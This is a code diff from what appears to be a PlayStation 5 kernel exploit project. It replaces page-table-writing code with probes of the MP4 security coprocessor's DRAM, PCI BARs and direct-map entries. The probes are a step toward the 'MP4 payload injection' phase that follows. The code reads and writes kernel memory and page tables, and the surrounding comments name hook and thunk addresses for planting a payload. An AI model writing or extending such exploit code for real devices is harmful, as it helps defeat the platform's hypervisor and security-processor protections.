@@ -43,7 +43,6 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include <sys/mman.h>
 #include <ps5/kernel.h>
 #include "prosperous.h"
 
@@ -213,262 +212,118 @@ int prosperous_run(void)
     }
     printf("[+] TMR 20 disabled, TMR 21 created\n");
 
-    /* Phase 1.5: Ensure DMAP mapping for MP4 DRAM (PA 0x60000000) */
-    printf("\n[*] Phase 1.5: Creating DMAP mapping for MP4 DRAM...\n");
+    /* Phase 1.5: Scan for DRAM access paths
+     *
+     * CRITICAL: We CANNOT create page table entries for PA 0x60000000.
+     * The HV's nested page tables don't map this guest-PA. Creating a
+     * PDE causes instant kernel panic from speculative access on other
+     * cores triggering a #NPF the HV can't handle.
+     *
+     * Instead, scan for alternative DRAM access mechanisms:
+     *   1. BAR2 MMIO aperture (DRAM window in MP4 register space)
+     *   2. PCI device scan for additional BARs
+     *   3. Existing DMAP entries (PA 0x60600000+ already mapped)
+     */
+    printf("\n[*] Phase 1.5: Scanning for DRAM access paths...\n");
+    printf("[*] NOTE: Cannot create PDE for PA 0x60000000 (nPT panic)\n");
     {
         uint64_t dmap = ctx.dmap_base;
-        uint64_t target_va = dmap + MP4_DRAM_BASE;
-        uint32_t pml4_idx = (target_va >> 39) & 0x1FF;
-        uint32_t pdpt_idx = (target_va >> 30) & 0x1FF;
-        uint32_t pd_idx   = (target_va >> 21) & 0x1FF;
+        uint64_t bar2_kva = dmap + MP4_BAR2_PA;
+        uint32_t probe;
+        int32_t rc;
 
-        printf("[*] DMAP VA for DRAM: 0x%lx\n", target_va);
-        printf("[*] Indices: PML4[0x%x] PDPT[0x%x] PD[0x%x]\n",
-               pml4_idx, pdpt_idx, pd_idx);
-
-        /* Use process CR3 (correct!) instead of kpml4_pa (wrong offset) */
-        uint64_t cr3 = ctx.proc_cr3;
-        printf("[*] Using process CR3: 0x%lx (kpml4_pa was 0x%lx)\n",
-               cr3, ctx.kpml4_pa);
-
-        /* Walk PML4 */
-        uint64_t pml4e;
-        kernel_copyout(dmap + cr3 + pml4_idx * 8, &pml4e, 8);
-        printf("[DIAG] PML4[0x%x] = 0x%016lx %s\n", pml4_idx, pml4e,
-               (pml4e & 1) ? "PRESENT" : "NOT PRESENT");
-
-        if (!(pml4e & 1)) {
-            printf("[!] PML4 not present - cannot create DRAM mapping\n");
-            goto phase2;
+        /* Probe BAR2 at various offsets for ELF magic (0x464C457F).
+         * The A53 ELF is at A53 VA 0x100000. If BAR2 provides a DRAM
+         * window, the ELF magic might appear at one of these offsets. */
+        printf("[*] Probing BAR2 (PA 0x%llx) for DRAM window...\n",
+               (unsigned long long)MP4_BAR2_PA);
+        uint32_t bar2_offsets[] = {
+            0x000000, 0x010000, 0x020000, 0x040000,
+            0x060000, 0x080000, 0x0F0000, 0x100000,
+            0x200000, 0x400000, 0x600000, 0x800000,
+            0xA00000, 0xC00000, 0xE00000, 0x1000000
+        };
+        for (uint32_t i = 0; i < sizeof(bar2_offsets)/sizeof(bar2_offsets[0]); i++) {
+            probe = 0;
+            rc = kernel_copyout(bar2_kva + bar2_offsets[i], &probe, 4);
+            printf("[DIAG] BAR2+0x%07x = 0x%08x (rc=%d)%s\n",
+                   bar2_offsets[i], probe, rc,
+                   probe == 0x464C457F ? " <<< ELF MAGIC >>>" : "");
         }
 
-        uint64_t pdpt_pa = pml4e & 0xFFFFFFFFFF000ULL;
+        /* Scan PCI bus 0 for MP4 device and dump BARs.
+         * ECAM base = 0xF0000000, config address = ECAM + (dev<<15) + reg */
+        printf("\n[*] Scanning PCI bus 0 for multimedia devices...\n");
+        for (uint32_t dev = 0; dev < 32; dev++) {
+            uint32_t ecam_off = (dev << 15);
+            uint32_t dev_id;
+            kernel_copyout(dmap + 0xF0000000ULL + ecam_off, &dev_id, 4);
+            if (dev_id == 0xFFFFFFFF || dev_id == 0)
+                continue;
 
-        /* Walk PDPT */
-        uint64_t pdpte;
-        kernel_copyout(dmap + pdpt_pa + pdpt_idx * 8, &pdpte, 8);
-        printf("[DIAG] PDPT[0x%x] = 0x%016lx %s%s\n", pdpt_idx, pdpte,
-               (pdpte & 1) ? "PRESENT" : "NOT PRESENT",
-               (pdpte & (1 << 7)) ? " 1GB-PAGE" : "");
+            printf("[PCI] B0:D%u:F0 ID=0x%08x", dev, dev_id);
 
-        if (!(pdpte & 1)) {
-            /* PDPT entry missing - need to allocate a PD page and create it.
-             * Use mmap to get a physical page, then use it as our PD. */
-            printf("[*] Allocating PD page for DRAM mapping...\n");
-
-            /* mmap a 4KB page to use as PD */
-            void *pd_user = (void *)__builtin_frame_address(0);
-            {
-                /* Use syscall directly since we might not have mmap linked */
-                pd_user = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
-                               MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+            /* Read BAR0-BAR5 (offsets 0x10-0x24) */
+            for (int bar = 0; bar < 6; bar++) {
+                uint32_t bar_val;
+                kernel_copyout(dmap + 0xF0000000ULL + ecam_off + 0x10 + bar * 4,
+                               &bar_val, 4);
+                if (bar_val != 0 && bar_val != 0xFFFFFFFF)
+                    printf(" BAR%d=0x%08x", bar, bar_val);
             }
-            if (pd_user == MAP_FAILED) {
-                printf("[!] mmap failed for PD page\n");
-                goto phase2;
-            }
+            printf("\n");
+        }
 
-            /* Zero the page and touch it to ensure PTE exists */
-            memset(pd_user, 0, 0x1000);
+        /* Test existing DMAP at PA 0x60600000 (PD[0x103], known mapped) */
+        printf("\n[*] Testing existing DMAP mappings in DRAM range...\n");
+        uint64_t test_pas[] = {
+            0x60400000ULL, 0x60500000ULL, 0x60600000ULL,
+            0x60700000ULL, 0x607F1000ULL
+        };
+        for (uint32_t i = 0; i < sizeof(test_pas)/sizeof(test_pas[0]); i++) {
+            probe = 0xDEADDEAD;
+            rc = kernel_copyout(dmap + test_pas[i], &probe, 4);
+            printf("[DIAG] DMAP+0x%09llx: 0x%08x (rc=%d)%s\n",
+                   (unsigned long long)test_pas[i], probe, rc,
+                   probe == 0x464C457F ? " <<< ELF >>>" : "");
+        }
 
-            /* Walk process page tables to find PA of our PD page */
-            uint64_t pd_phys = 0;
-            {
-                uint64_t va = (uint64_t)pd_user;
-                uint64_t l4_idx = (va >> 39) & 0x1FF;
-                uint64_t l3_idx = (va >> 30) & 0x1FF;
-                uint64_t l2_idx = (va >> 21) & 0x1FF;
-                uint64_t l1_idx = (va >> 12) & 0x1FF;
-                uint64_t entry;
+        /* Read 4KB PTEs from PD[0x102] (PA 0x60400000-0x605FFFFF) */
+        printf("\n[*] Reading PD[0x102] 4KB page table entries...\n");
+        {
+            uint64_t target_va = dmap + MP4_DRAM_BASE;
+            uint32_t pml4_idx = (target_va >> 39) & 0x1FF;
+            uint32_t pdpt_idx = (target_va >> 30) & 0x1FF;
+            uint32_t pd_idx   = (target_va >> 21) & 0x1FF;
+            uint64_t cr3 = ctx.proc_cr3;
+            uint64_t pml4e, pdpte;
 
-                /* PML4 */
-                kernel_copyout(dmap + cr3 + l4_idx * 8, &entry, 8);
-                if (!(entry & 1)) { printf("[!] PD user PML4 NP\n"); goto phase2; }
-                uint64_t l3_pa = entry & 0xFFFFFFFFFF000ULL;
-
-                /* PDPT */
-                kernel_copyout(dmap + l3_pa + l3_idx * 8, &entry, 8);
-                if (!(entry & 1)) { printf("[!] PD user PDPT NP\n"); goto phase2; }
-                if (entry & (1 << 7)) {
-                    pd_phys = (entry & 0xFFFFFFC0000000ULL) | (va & 0x3FFFFFFF);
-                } else {
-                    uint64_t l2_pa = entry & 0xFFFFFFFFFF000ULL;
-
-                    /* PD */
-                    kernel_copyout(dmap + l2_pa + l2_idx * 8, &entry, 8);
-                    if (!(entry & 1)) { printf("[!] PD user PD NP\n"); goto phase2; }
-                    if (entry & (1 << 7)) {
-                        pd_phys = (entry & 0xFFFFFFFE00000ULL) | (va & 0x1FFFFF);
-                    } else {
-                        uint64_t l1_pa = entry & 0xFFFFFFFFFF000ULL;
-
-                        /* PT */
-                        kernel_copyout(dmap + l1_pa + l1_idx * 8, &entry, 8);
-                        if (!(entry & 1)) { printf("[!] PD user PT NP\n"); goto phase2; }
-                        pd_phys = (entry & 0xFFFFFFFFFF000ULL) | (va & 0xFFF);
+            kernel_copyout(dmap + cr3 + pml4_idx * 8, &pml4e, 8);
+            if (pml4e & 1) {
+                uint64_t pdpt_pa = pml4e & 0xFFFFFFFFFF000ULL;
+                kernel_copyout(dmap + pdpt_pa + pdpt_idx * 8, &pdpte, 8);
+                if ((pdpte & 1) && !(pdpte & (1 << 7))) {
+                    uint64_t pd_pa = pdpte & 0xFFFFFFFFFF000ULL;
+                    uint64_t pd102;
+                    kernel_copyout(dmap + pd_pa + (pd_idx + 2) * 8, &pd102, 8);
+                    if ((pd102 & 1) && !(pd102 & (1 << 7))) {
+                        uint64_t pt_pa = pd102 & 0xFFFFFFFFFF000ULL;
+                        printf("[*] PD[0x%x] -> PT at PA 0x%lx\n",
+                               pd_idx + 2, pt_pa);
+                        /* Dump first 8 PTEs */
+                        for (int j = 0; j < 8; j++) {
+                            uint64_t pte;
+                            kernel_copyout(dmap + pt_pa + j * 8, &pte, 8);
+                            if (pte & 1) {
+                                printf("[DIAG] PT[%d] = 0x%016lx -> PA 0x%llx\n",
+                                       j, pte, (unsigned long long)(pte & 0xFFFFFFFFFF000ULL));
+                            }
+                        }
                     }
                 }
             }
-
-            /* pd_phys is the page-aligned PA of our mmap'd page */
-            pd_phys &= ~0xFFFULL;
-            printf("[*] PD page PA: 0x%lx\n", pd_phys);
-
-            /* Fill the PD page with 2MB entries covering the DRAM range.
-             * We write to it via DMAP (our page IS in real RAM, so DMAP works). */
-            for (uint32_t i = 0; i < 512; i++) {
-                /* Compute what PA this PD entry should map.
-                 * The PDPT[0xF5] covers a 1GB range. For DMAP, the 1GB PA is:
-                 * pdpt_idx * 1GB minus whatever the DMAP mapping covers.
-                 * Actually, for DMAP linear mapping: the 1GB range covered by
-                 * PDPT[F5] is simply the 1GB aligned to the PA space.
-                 *
-                 * For VA = DMAP + 0x60000000:
-                 *   PDPT[0xF5] covers VA range [DMAP+F5*1GB, DMAP+(F5+1)*1GB)
-                 *   But F5*1GB = 0x3D40000000 which doesn't equal 0x60000000.
-                 *   This means the DMAP uses PML4 to offset.
-                 *
-                 * The PA mapped by PDPT[pdpt_idx] PD[i] in DMAP context:
-                 *   PA = ((PML4_offset * 512 + pdpt_idx) * 512 + i) * 2MB
-                 *   where PML4_offset is (target_va >> 39) relative to DMAP
-                 *
-                 * Simplification: the PDPT[0xF5] should map PAs in the range
-                 * that includes 0x60000000. Since we know pd_idx=0x100 maps
-                 * PA 0x60000000, the formula is:
-                 *   PA = (PD_entry_index - pd_idx_for_0x60000000) * 2MB + 0x60000000
-                 * But that only works for the entries near pd_idx.
-                 *
-                 * General: PA = (pdpt_base_pa) + i * 2MB
-                 * where pdpt_base_pa is the start of the 1GB range.
-                 *
-                 * From target_va = DMAP + 0x60000000:
-                 *   The 1GB aligned base of 0x60000000 is 0x40000000
-                 *   (since 0x40000000 = 1GB, 0x80000000 = 2GB)
-                 *   So pdpt_base_pa = 0x40000000
-                 * Then PD[i] maps PA = 0x40000000 + i * 0x200000
-                 * And PD[0x100] maps PA = 0x40000000 + 0x100*0x200000 = 0x60000000 ✓
-                 */
-                uint64_t entry_pa = 0x40000000ULL + (uint64_t)i * 0x200000ULL;
-                uint64_t pde;
-
-                /* Only create entries for the DRAM range with UC.
-                 * For all other entries, create normal WB entries so
-                 * other memory in this 1GB range still works. */
-                if (entry_pa >= MP4_DRAM_BASE &&
-                    entry_pa < (MP4_DRAM_BASE + 0x800000)) {
-                    /* DRAM region: UC (PCD=1) */
-                    pde = entry_pa |
-                          (1ULL << 0) |  /* Present */
-                          (1ULL << 1) |  /* RW */
-                          (1ULL << 4) |  /* PCD */
-                          (1ULL << 5) |  /* Accessed */
-                          (1ULL << 6) |  /* Dirty */
-                          (1ULL << 7);   /* PS (2MB) */
-                } else {
-                    /* Normal memory: WB (same as typical DMAP) */
-                    pde = entry_pa |
-                          (1ULL << 0) |  /* Present */
-                          (1ULL << 1) |  /* RW */
-                          (1ULL << 5) |  /* Accessed */
-                          (1ULL << 6) |  /* Dirty */
-                          (1ULL << 7);   /* PS (2MB) */
-                }
-
-                kernel_copyin(&pde, dmap + pd_phys + i * 8, 8);
-            }
-
-            printf("[+] Filled PD page with 512 x 2MB entries\n");
-            printf("[+] DRAM entries (PD[0x%x]-PD[0x%x]) have PCD set\n",
-                   pd_idx, pd_idx + 3);
-
-            /* Create PDPT entry pointing to our PD page */
-            uint64_t new_pdpte = pd_phys |
-                                 (1ULL << 0) |  /* Present */
-                                 (1ULL << 1) |  /* RW */
-                                 (1ULL << 5);   /* Accessed */
-            kernel_copyin(&new_pdpte, dmap + pdpt_pa + pdpt_idx * 8, 8);
-            printf("[+] Created PDPT[0x%x] = 0x%016lx -> PD at PA 0x%lx\n",
-                   pdpt_idx, new_pdpte, pd_phys);
-
-            /* Verify DRAM access works now */
-            uint32_t test_val = 0xDEADDEAD;
-            int32_t rc = kernel_copyout(dmap + MP4_DRAM_BASE,
-                                        &test_val, sizeof(test_val));
-            printf("[DIAG] DRAM[0] after mapping: 0x%08x (rc=%d)\n",
-                   test_val, rc);
-
-            if (rc == 0 && test_val != 0xDEADDEAD) {
-                printf("[+] DRAM access working!\n");
-            } else {
-                printf("[!] DRAM access still failing\n");
-            }
-        } else if ((pdpte & 1) && (pdpte & (1 << 7))) {
-            /* 1GB page - set PCD */
-            printf("[*] DRAM mapped via 1GB page, setting PCD...\n");
-            uint64_t new_pdpte = pdpte | (1ULL << 4);
-            kernel_copyin(&new_pdpte, dmap + pdpt_pa + pdpt_idx * 8, 8);
-
-            uint32_t test_val = 0xDEADDEAD;
-            int32_t rc = kernel_copyout(dmap + MP4_DRAM_BASE,
-                                        &test_val, sizeof(test_val));
-            printf("[DIAG] DRAM[0] after PCD: 0x%08x (rc=%d)\n",
-                   test_val, rc);
-        } else {
-            /* PDPT present, not 1GB page - check PD entries and fix only
-             * the single entry we need (PD[pd_idx] covering MP4_DRAM_BASE).
-             * Minimise page table modifications to avoid kernel panics from
-             * speculative accesses or TLB coherency issues on other cores. */
-            uint64_t pd_pa = pdpte & 0xFFFFFFFFFF000ULL;
-            printf("[*] PDPT -> PD at PA 0x%lx\n", pd_pa);
-
-            /* Dump a few entries for diagnostics */
-            for (int i = 0; i < 5; i++) {
-                uint64_t pde;
-                kernel_copyout(dmap + pd_pa + (pd_idx + i) * 8, &pde, 8);
-                printf("[DIAG] PD[0x%x] = 0x%016lx %s\n",
-                       pd_idx + i, pde, (pde & 1) ? "P" : "NP");
-            }
-
-            /* Only create PD[pd_idx] (covers PA 0x60000000-0x601FFFFF)
-             * which has the thunk (0x600E0000), hook (0x60108BD4), and
-             * QAF flags (0x60123B74). Payload at 0x607F1000 is already
-             * in PD[0x103] which exists. */
-            uint64_t pde;
-            kernel_copyout(dmap + pd_pa + pd_idx * 8, &pde, 8);
-
-            if (!(pde & 1)) {
-                uint64_t target_pa = 0x40000000ULL + (uint64_t)pd_idx * 0x200000ULL;
-
-                /* Match flags exactly to working PD[0x103]=0x80000000606001e3:
-                 * NX(63) | G(8) | PS(7) | D(6) | A(5) | RW(1) | P(0)
-                 * NO PCD — use WB caching like existing entries.
-                 * Previous attempts with PCD panicked instantly. */
-                uint64_t new_pde = target_pa |
-                                   (1ULL << 0) |   /* Present */
-                                   (1ULL << 1) |   /* RW */
-                                   (1ULL << 5) |   /* Accessed */
-                                   (1ULL << 6) |   /* Dirty */
-                                   (1ULL << 7) |   /* PS (2MB) */
-                                   (1ULL << 8) |   /* Global */
-                                   (1ULL << 63);   /* NX */
-                kernel_copyin(&new_pde, dmap + pd_pa + pd_idx * 8, 8);
-                printf("[+] Created PD[0x%x] = 0x%016lx (2MB WB, PA 0x%lx)\n",
-                       pd_idx, new_pde, target_pa);
-
-                /* Do NOT verify by reading DRAM here — previous attempts
-                 * panicked on the verification read. The nested page tables
-                 * (HV active) might not map guest PA 0x60000000.
-                 * Instead, skip to Phase 2 which will attempt DRAM writes.
-                 * If those also panic, we need a DMA-based approach. */
-                printf("[*] Skipping DRAM verification (panic avoidance)\n");
-                printf("[*] Will test access in Phase 2...\n");
-            } else {
-                printf("[*] PD[0x%x] already present: 0x%016lx\n", pd_idx, pde);
-            }
         }
     }
-
-phase2:
 
     /* Phase 2: MP4 payload injection */
     printf("\n[*] Phase 2: MP4 payload injection...\n");
